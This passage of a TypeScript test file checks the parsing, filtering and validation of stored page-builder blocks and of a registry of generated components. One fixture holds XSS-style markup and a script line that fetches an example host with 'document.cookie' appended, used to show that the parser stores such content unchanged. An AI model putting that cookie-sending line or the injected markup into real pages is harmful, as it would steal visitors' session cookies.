          children: [
            storedBlock({ id: 'Title-2' }),
            { kind: 'puck', type: 'Title', props: {} },
          ],
        }),
      ],
    ],
    [
      'an invalid grandchild',
      [
        storedBlock({
          children: [
            storedBlock({ id: 'Title-2', children: [storedBlock({ id: '' })] }),
          ],
        }),
      ],
    ],
  ],
};

describe('the stored block format', () => {
  it.each(storedBlockFormat.valid)('accepts %s', (_, blocks) => {
    expect(parsePuckBlocks(blocks)).toEqual(blocks);
  });

  it.each(storedBlockFormat.invalid)('rejects %s', (_, blocks) => {
    expect(() => parsePuckBlocks(blocks)).toThrow(PuckBlocksError);
  });
});

describe('filterPuckBlocks', () => {
  const hidden = (id: string, extra: Partial<ApiBlock> = {}) =>
    block(id, { hidden: true }, extra);

  const keepVisible = (entry: ApiBlock) => !entry.props['hidden'];

  it('returns the same blocks when every block is kept', () => {
    const blocks = [
      block(
        'a',
        { content: [] },
        { children: [block('b', {}, { puckSlot: 'content' })] }
      ),
      block('c'),
    ];

    expect(filterPuckBlocks(blocks, keepVisible)).toBe(blocks);
  });

  it('drops top level blocks', () => {
    expect(
      filterPuckBlocks([block('a'), hidden('b'), block('c')], keepVisible)
    ).toEqual([block('a'), block('c')]);
  });

  it('drops children however deep, with their own children', () => {
    const blocks = [
      block(
        'grid',
        {},
        {
          children: [
            block('column', {}, { children: [block('a'), hidden('b')] }),
            hidden('c', { children: [block('d')] }),
          ],
        }
      ),
    ];

    expect(filterPuckBlocks(blocks, keepVisible)).toEqual([
      block(
        'grid',
        {},
        { children: [block('column', {}, { children: [block('a')] })] }
      ),
    ]);
  });

  it('never asks about the children of a dropped block', () => {
    const keep = vi.fn(keepVisible);

    filterPuckBlocks([hidden('a', { children: [block('b')] })], keep);

    expect(keep.mock.calls.map(([entry]) => entry.id)).toEqual(['a']);
  });

  it('keeps untouched blocks as they are', () => {
    const untouched = block(
      'a',
      { items: [{ content: [] }] },
      { children: [block('b')] }
    );

    const [kept] = filterPuckBlocks([untouched, hidden('c')], keepVisible);

    expect(kept).toBe(untouched);
  });

  it('only walks children, never props', () => {
    const blocks = [
      block('a', { content: [hidden('b')], card: { hidden: true } }),
    ];

    expect(filterPuckBlocks(blocks, keepVisible)).toBe(blocks);
  });
});

describe('the order of stored children', () => {
  const slotted = (id: string, puckSlot?: string) =>
    block(id, {}, puckSlot ? { puckSlot } : {});

  const childIds = (blocks: ApiBlock[]) =>
    blocks.map(({ id, children }) => [id, children?.map(child => child.id)]);

  it('groups the children by slot in the order the slots first appear', () => {
    const [grid] = parsePuckBlocks([
      block(
        'grid',
        {},
        {
          children: [
            slotted('a', 'items[1].content'),
            slotted('b', 'items[0].content'),
            slotted('c', 'items[1].content'),
            slotted('d'),
            slotted('e', 'items[0].content'),
            slotted('f', 'content'),
          ],
        }
      ),
    ]);

    expect(grid.children?.map(({ id }) => id)).toEqual([
      'a',
      'c',
      'b',
      'e',
      'd',
      'f',
    ]);
  });

  it('groups the children of children too', () => {
    const blocks = parsePuckBlocks([
      block(
        'outer',
        {},
        {
          children: [
            block(
              'inner',
              {},
              {
                children: [
                  slotted('x', 'left'),
                  slotted('y', 'right'),
                  slotted('z', 'left'),
                ],
              }
            ),
          ],
        }
      ),
    ]);

    expect(blocks[0].children?.[0].children?.map(({ id }) => id)).toEqual([
      'x',
      'z',
      'y',
    ]);
  });

  it('keeps the top level in the order it was given', () => {
    expect(
      childIds(
        parsePuckBlocks([slotted('a', 'side'), slotted('b'), slotted('c')])
      )
    ).toEqual([
      ['a', undefined],
      ['b', undefined],
      ['c', undefined],
    ]);
  });
});

describe('orderPuckChildren', () => {
  it('groups by slot in order of first appearance and keeps the order inside a slot', () => {
    const children = [
      { id: 'a', puckSlot: 'right' },
      { id: 'b' },
      { id: 'c', puckSlot: 'right' },
      { id: 'd', puckSlot: 'content' },
      { id: 'e', puckSlot: 'left' },
    ];

    expect(orderPuckChildren(children).map(({ id }) => id)).toEqual([
      'a',
      'c',
      'b',
      'd',
      'e',
    ]);
  });

  it('leaves the children it was given alone', () => {
    const children = [
      { id: 'a', puckSlot: 'right' },
      { id: 'b', puckSlot: 'left' },
      { id: 'c', puckSlot: 'right' },
    ];

    orderPuckChildren(children);

    expect(children.map(({ id }) => id)).toEqual(['a', 'b', 'c']);
  });

  it('orders nothing to nothing', () => {
    expect(orderPuckChildren([])).toEqual([]);
  });
});

const heroBanner = {
  label: 'Hero banner',
  html: '<section class="hero"><h1 data-puck-field-name="title">Hello</h1><div data-puck-slot="content"></div></section>',
  styles: '.hero { padding: 2rem; }',
  script:
    'document.querySelectorAll(".hero").forEach(hero => hero.classList.add("ready"));',
  fields: { title: { type: 'text' }, content: { type: 'slot' } },
  defaultProps: { title: 'Hello' },
};

const puckRegistry = (extra: Record<string, unknown> = {}) => ({
  components: { HeroBanner: heroBanner },
  styles: ':root { --accent: #ff0055; }',
  script: 'window.dispatchEvent(new Event("designed"));',
  ...extra,
});

const generated = (
  id: string,
  type = 'HeroBanner',
  extra: Partial<ApiBlock> = {}
): ApiBlock => ({ id, kind: 'generated', type, props: {}, ...extra });

describe('parsePuckRegistry', () => {
  it('stores the registry exactly as Puck AI keeps it, scripts included', () => {
    expect(parsePuckRegistry(puckRegistry())).toEqual(puckRegistry());
  });

  it('accepts a registry without components', () => {
    expect(parsePuckRegistry({ components: {} })).toEqual({ components: {} });
  });

  it('accepts a component that is only markup', () => {
    expect(parsePuckRegistry({ components: { Empty: { html: '' } } })).toEqual({
      components: { Empty: { html: '' } },
    });
  });

  it('never looks inside the markup, styles or script', () => {
    const registry = puckRegistry({
      components: {
        Unsafe: {
          html: '<img src="x" onerror="alert(1)"><script>alert(2)</script>',
          styles: 'body { background: url(https://example.com/x.png) }',
          script: 'fetch("https://example.com/" + document.cookie)',
        },
      },
    });

    expect(parsePuckRegistry(registry)).toEqual(registry);
  });

  it('keeps a component Puck AI is still streaming', () => {
    const registry = puckRegistry({
      components: { HeroBanner: { html: '<section><h1', streaming: true } },
    });

    expect(parsePuckRegistry(registry)).toEqual(registry);
  });

  it('passes on the component keys it does not know', () => {
    const registry = puckRegistry({
      components: {
        HeroBanner: {
          ...heroBanner,
          version: 2,
          resolveData: { from: 'title' },
        },
      },
    });

    expect(parsePuckRegistry(registry)).toEqual(registry);
  });

  it('drops the values a GraphQL client sent as null', () => {
    expect(
      parsePuckRegistry({
        components: { HeroBanner: { html: '<p></p>', label: null } },
        styles: null,
        script: null,
      })
    ).toEqual({ components: { HeroBanner: { html: '<p></p>' } } });
  });

  it('accepts a script as long as the cap', () => {
    const script = 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH);

    expect(parsePuckRegistry(puckRegistry({ script })).script).toBe(script);
  });

  it('throws a bad request for an invalid registry', () => {
    expect(() => parsePuckRegistry(null)).toThrow(BadRequestException);
    expect(() => parsePuckRegistry(null)).toThrow(PuckBlocksError);
  });

  it.each([
    ['null', null, 'registry must be an object'],
    ['a list', [], 'registry must be an object'],
    ['no components', { styles: '' }, 'registry.components is required'],
    [
      'components as a list',
      { components: [{ name: 'HeroBanner', ...heroBanner }] },
      'registry.components must be an object',
    ],
    [
      'a component that is not an object',
      { components: { HeroBanner: '<p></p>' } },
      'registry.components.HeroBanner must be an object',
    ],
    [
      'a component without markup',
      { components: { HeroBanner: { label: 'Hero' } } },
      'registry.components.HeroBanner.html is required',
    ],
    [
      'markup that is not a string',
      { components: { HeroBanner: { html: ['<p></p>'] } } },
      'registry.components.HeroBanner.html must be a string',
    ],
    [
      'a label that is not a string',
      { components: { HeroBanner: { html: '', label: 1 } } },
      'registry.components.HeroBanner.label must be a string',
    ],
    [
      'component styles that are not a string',
      { components: { HeroBanner: { html: '', styles: {} } } },
      'registry.components.HeroBanner.styles must be a string',
    ],
    [
      'fields that are not an object',
      { components: { HeroBanner: { html: '', fields: [] } } },
      'registry.components.HeroBanner.fields must be an object',
    ],
    [
      'a field that is null',
      { components: { HeroBanner: { html: '', fields: { title: null } } } },
      'registry.components.HeroBanner.fields.title must be an object',
    ],
    [
      'a field that is not an object',
      { components: { HeroBanner: { html: '', fields: { title: 'text' } } } },
      'registry.components.HeroBanner.fields.title must be an object',
    ],
    [
      'a field that is a list',
      {
        components: {
          HeroBanner: { html: '', fields: { title: [{ type: 'text' }] } },
        },
      },
      'registry.components.HeroBanner.fields.title must be an object',
    ],
    [
      'default props that are not an object',
      { components: { HeroBanner: { html: '', defaultProps: 'title' } } },
      'registry.components.HeroBanner.defaultProps must be an object',
    ],
    [
      'a streaming flag that is not a boolean',
      { components: { HeroBanner: { html: '<p', streaming: 'yes' } } },
      'registry.components.HeroBanner.streaming must be a boolean',
    ],
    [
      'a component script longer than the cap',
      {
        components: {
          HeroBanner: {
            html: '',
            script: 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH + 1),
          },
        },
      },
      `registry.components.HeroBanner.script must be at most ${MAX_PUCK_SCRIPT_LENGTH} characters`,
    ],
    [
      'a script that is not a string',
      { components: {}, script: () => undefined },
      'registry.script must be a string',
    ],
    [
      'a script longer than the cap',
      { components: {}, script: 'x'.repeat(MAX_PUCK_SCRIPT_LENGTH + 1) },
      `registry.script must be at most ${MAX_PUCK_SCRIPT_LENGTH} characters`,
    ],
    [
      'styles that are not a string',
      { components: {}, styles: 1 },
      'registry.styles must be a string',
    ],
    [
      'an unknown registry key',
      { components: {}, version: 2 },
      'registry must not have version',
    ],
    [
      'a component without a name',
      { components: { '': { html: '' } } },
      'registry.components must name every component with 1 to 100 characters',
    ],
    [
      'a component name longer than 100 characters',
      { components: { ['A'.repeat(101)]: { html: '' } } },
      'registry.components must name every component with 1 to 100 characters',
    ],
    [
      'more components than the cap',
      {
        components: Object.fromEntries(
          Array.from(
            { length: MAX_PUCK_REGISTRY_COMPONENTS + 1 },
            (_, index) => [`Component${index}`, { html: '' }]
          )
        ),
      },
      `registry.components must have at most ${MAX_PUCK_REGISTRY_COMPONENTS} components`,
    ],
  ])('rejects %s', (_, value, message) => {
    expect(() => parsePuckRegistry(value)).toThrow(
      `Puck registry is invalid: ${message}.`
    );
  });

  it('rejects a registry larger than the size cap', () => {
    const registry = {
      components: {
        HeroBanner: { html: 'x'.repeat(MAX_PUCK_BLOCKS_LENGTH) },
      },
    };

    expect(() => parsePuckRegistry(registry)).toThrow(
      'Puck registry is too large'
    );
  });
});

describe('parsePuckDocument', () => {
  it('parses the blocks and the registry together', () => {
    const blocks = [generated('hero-1'), block('heading-1')];

    expect(parsePuckDocument({ blocks, registry: puckRegistry() })).toEqual({
      blocks,
      registry: puckRegistry(),
    });
  });

  it.each([null, undefined])('has no registry when it is %s', registry => {
    expect(parsePuckDocument({ blocks: [block('a')], registry })).toEqual({
      blocks: [block('a')],
      registry: null,
    });
  });

  it('accepts generated blocks the registry declares, however deep they sit', () => {
    const blocks = [
      block(
        'grid-1',
        {},
        {
          children: [
            generated('hero-1', 'HeroBanner', {
              children: [
                generated('hero-2', 'HeroBanner', { puckSlot: 'content' }),
              ],
            }),
          ],
        }
      ),
    ];

    expect(
      parsePuckDocument({ blocks, registry: puckRegistry() }).blocks
    ).toEqual(blocks);
  });

  it('never looks puck blocks up in the registry', () => {
    const blocks = [block('a', {}, { type: 'NotGenerated' })];

    expect(parsePuckDocument({ blocks, registry: null }).blocks).toEqual(
      blocks
    );
  });

  it.each([
    [
      'a generated block without a registry',
      [block('a'), generated('hero-1')],
      null,
      'blocks[1].type must name a generated component of the registry',
    ],
    [
      'a generated block the registry does not declare',
      [generated('hero-1', 'Teaser')],
      puckRegistry(),
      'blocks[0].type must name a generated component of the registry',
    ],
    [
      'a nested generated block the registry does not declare',
      [
        block(
          'grid-1',
          {},
          { children: [block('b'), generated('hero-1', 'Footer')] }
        ),
      ],
      puckRegistry(),
      'blocks[0].children[1].type must name a generated component of the registry',
    ],
    [
      'a generated block named after an object property',
      [generated('hero-1', 'constructor')],
      puckRegistry(),
      'blocks[0].type must name a generated component of the registry',
    ],
  ])('rejects %s', (_, blocks, registry, message) => {
    expect(() => parsePuckDocument({ blocks, registry })).toThrow(
      `Puck blocks are invalid: ${message}.`
    );
  });

  it('reports invalid blocks before an invalid registry', () => {
    expect(() =>
      parsePuckDocument({ blocks: [{ id: 'a' }], registry: { components: [] } })
    ).toThrow('Puck blocks are invalid: blocks[0].kind');
  });

  it('reports an invalid registry', () => {
    expect(() =>
      parsePuckDocument({ blocks: [], registry: { components: [] } })
    ).toThrow(
      'Puck registry is invalid: registry.components must be an object.'
    );
  });
});

describe('isStoredPuckBlocks', () => {
  it.each([
    ['an empty list', []],
    ['puck and generated blocks', [block('a'), generated('b')]],
    [
      'children that are not grouped by slot yet',
      [
        block(
          'grid',
          {},
          {
            children: [
              block('a', {}, { puckSlot: 'right' }),
              block('b', {}, { puckSlot: 'left' }),
              block('c', {}, { puckSlot: 'right' }),
            ],
          }
        ),
      ],
    ],
  ])('accepts %s', (_, json) => {
    expect(isStoredPuckBlocks(json)).toBe(true);
  });

  it.each([
    ['null', null],
    ['puck data', { root: {}, content: [] }],
    [
      'blocks stored before the envelope had a kind',
      [{ id: 'a', type: 'Heading', data: {}, slot: 'content' }],
    ],
    ['duplicate ids', [block('a'), block('a')]],
    ['blocks nested too deep', chain(MAX_PUCK_BLOCKS_DEPTH + 1)],
  ])('refuses %s without throwing', (_, json) => {
    expect(isStoredPuckBlocks(json)).toBe(false);
  });
});

describe('isStoredPuckRegistry', () => {
  it('accepts a registry as Puck AI keeps it', () => {
    expect(isStoredPuckRegistry(puckRegistry())).toBe(true);
  });

  it.each([
    ['null', null],
    ['components as a list', { components: [] }],
    ['a component without markup', { components: { HeroBanner: {} } }],
  ])('refuses %s without throwing', (_, json) => {
    expect(isStoredPuckRegistry(json)).toBe(false);
  });
});

describe('readStoredPuckBlocks', () => {
  it('reads stored blocks normalised like a fresh save', () => {
    expect(
      readStoredPuckBlocks([
        {
          ...block('grid'),
          locked: null,
          children: [
            block('a', {}, { puckSlot: 'right' }),
            { ...block('b', {}, { puckSlot: 'left' }), children: null },
            block('c', {}, { puckSlot: 'right' }),
          ],
        },
      ])
    ).toEqual([
      block(
        'grid',
        {},
        {
          children: [
            block('a', {}, { puckSlot: 'right' }),
            block('c', {}, { puckSlot: 'right' }),
            block('b', {}, { puckSlot: 'left' }),
          ],
        }
      ),
    ]);
  });

  it('reads a styling stored before it was split by breakpoint as the smallest breakpoint', () => {
    expect(
      readStoredPuckBlocks([
        {
          ...block('grid'),
          styling: { color: 'primary.main', margin: { top: 2 } },
          children: [
            { ...block('a'), styling: { shadow: 2, color: null } },
            { ...block('b'), styling: { md: { shadow: 4 } } },
            { ...block('c'), styling: {} },
          ],
        },
      ])
    ).toEqual([
      block(
        'grid',
        {},
        {
          styling: { xs: { color: 'primary.main', margin: { top: 2 } } },
          children: [
            block('a', {}, { styling: { xs: { shadow: 2 } } }),
            block('b', {}, { styling: { md: { shadow: 4 } } }),
            block('c', {}, { styling: {} }),
          ],
        }
      ),
    ]);
  });

  it('accepts a styling stored before it was split by breakpoint', () => {
    expect(
      isStoredPuckBlocks([{ ...block('a'), styling: { opacity: 50 } }])
    ).toBe(true);
  });

  it('still refuses an invalid styling stored before the breakpoints', () => {
    expect(
      readStoredPuckBlocks([{ ...block('a'), styling: { fontSize: '2rem' } }])
    ).toBeNull();
  });

  it.each([
    ['null', null],
    [
      'blocks stored before the envelope had a kind',
      [{ id: 'a', type: 'Heading', data: {}, slot: 'content' }],
    ],
    ['blocks nested too deep', chain(MAX_PUCK_BLOCKS_DEPTH + 1)],
  ])('reads %s as none', (_, json) => {
    expect(readStoredPuckBlocks(json)).toBeNull();
  });
});

describe('readStoredPuckRegistry', () => {
  it('reads a stored registry without its null entries', () => {
    expect(readStoredPuckRegistry({ ...puckRegistry(), styles: null })).toEqual(
      { ...puckRegistry(), styles: undefined }
    );
  });

  it('reads a registry it cannot parse as none', () => {
    expect(readStoredPuckRegistry({ components: [] })).toBeNull();
  });
});
